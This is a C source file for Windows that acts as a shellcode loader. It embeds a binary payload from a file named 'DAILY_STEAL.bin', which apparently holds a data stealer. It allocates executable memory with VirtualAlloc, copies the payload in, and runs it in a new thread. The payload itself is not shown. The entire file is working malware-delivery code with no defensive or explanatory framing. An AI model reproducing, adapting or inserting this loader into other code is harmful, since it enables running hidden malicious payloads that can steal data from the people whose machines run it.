#include <windows.h>
#include <stdio.h>

unsigned char shellcode[] = {
    #include "DAILY_STEAL.bin"
};

int main() {
    SIZE_T size = sizeof(shellcode);
    printf("[+] Embedded stage loaded, %llu bytes\n", (unsigned long long)size);

    LPVOID addr = VirtualAlloc(0, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (addr == NULL) {
        printf("[-] VirtualAlloc failed\n");
        return -1;
    }
    printf("[+] Memory allocated at %p (%llu bytes)\n", addr, (unsigned long long)size);

    const SIZE_T chunkSize = 1024 * 1024;
    for (SIZE_T i = 0; i < size; i += chunkSize) {
        SIZE_T end = i + chunkSize;
        if (end > size) end = size;
        memcpy((unsigned char*)addr + i, shellcode + i, end - i);
        printf("[+] Copied bytes %llu–%llu\n", (unsigned long long)i, (unsigned long long)end);
    }

    HANDLE handle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)addr, NULL, 0, NULL);
    if (handle == NULL) {
        printf("[-] CreateThread failed\n");
        return -1;
    }
    printf("[+] Thread started, waiting...\n");

    WaitForSingleObject(handle, INFINITE);
    return 0;
}
